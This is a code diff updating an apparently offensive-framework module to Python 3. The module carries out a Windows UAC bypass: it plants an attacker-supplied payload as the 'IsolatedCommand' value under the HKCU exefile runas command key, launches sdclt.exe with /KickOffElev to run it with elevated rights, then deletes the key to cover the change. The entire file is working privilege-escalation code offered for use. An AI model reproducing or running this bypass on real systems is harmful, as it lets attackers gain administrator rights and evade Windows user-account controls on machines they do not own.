@@ -1,8 +1,12 @@
 #--encoding: utf-8--
 
-from module import Module
-from support.winreg import Registry
-from _winreg import HKEY_CURRENT_USER as HKCU
+try:
+    from ...module import Module
+    from ...support.winreg import Registry
+except ImportError:
+    from module import Module
+    from support.winreg import Registry
+from winreg import HKEY_CURRENT_USER as HKCU
 
 
 class CustomModule(Module):
@@ -21,15 +25,15 @@ class CustomModule(Module):
     def run_module(self):
         # To access user provided attributes, use self._args dictionary
         payload = self.args["payload"]
-        reg = Registry()        
-        print "Creating hive..."
-        key = reg.create_key(HKCU,"Software\\Classes\\exefile\\shell\\runas\\command")
-        print "Hive created"
-        print "Creating value IsolatedCommand..."
-        reg.create_value(key,"IsolatedCommand", payload)
-        print "Value created"
-        print "Executing... sdclt.exe"
+        reg = Registry()
+        print("Creating hive...")
+        key = reg.create_key(HKCU, "Software\\Classes\\exefile\\shell\\runas\\command")
+        print("Hive created")
+        print("Creating value IsolatedCommand...")
+        reg.create_value(key, "IsolatedCommand", payload)
+        print("Value created")
+        print("Executing... sdclt.exe")
         self.run_binary("C:\\Windows\\System32\\sdclt.exe", ["/KickOffElev"])
-        print "Got it? :D"
-        reg.delete_key(HKCU,"Software\\Classes\\exefile\\shell\\runas\\command")
-        print "Registry state restored"
+        print("Got it? :D")
+        reg.delete_key(HKCU, "Software\\Classes\\exefile\\shell\\runas\\command")
+        print("Registry state restored")
